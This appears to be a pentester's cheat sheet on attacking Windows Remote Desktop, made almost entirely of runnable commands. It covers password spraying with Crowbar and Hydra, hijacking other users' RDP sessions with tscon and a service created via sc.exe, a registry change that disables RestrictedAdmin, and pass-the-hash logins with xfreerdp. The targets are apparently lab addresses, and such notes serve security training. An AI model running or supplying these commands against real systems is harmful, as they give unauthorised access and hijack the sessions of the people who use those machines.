---
edit:
---

# RDP

## Tools

- [Crowbar](https://github.com/galkan/crowbar) - Password spaying

## Password Spraying

### Crowbar

```bash
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

### Hydra

```bash
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

### RDP Login

```bash
rdesktop -u admin -p password123 192.168.2.143
```

---

## Session Hijacking

```powershell
PS C:\> whoami
PS C:\> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

# Needs system level priv
C:\> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}

# w/out privs - get with psexec or mimikatz OR:
# Create a system service with sc
C:\> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
C:\> net start sessionhijack
```

## Pass-the-Hash

```cmd
# If error on xfreerdp login edit reg
C:\> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# Pass it
xfreerdp /v:10.129.11.133 /u:administrator /pth:0E14B9D6330BF16C30B1924111104824
```

## Vulns

- RCE - [CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708)

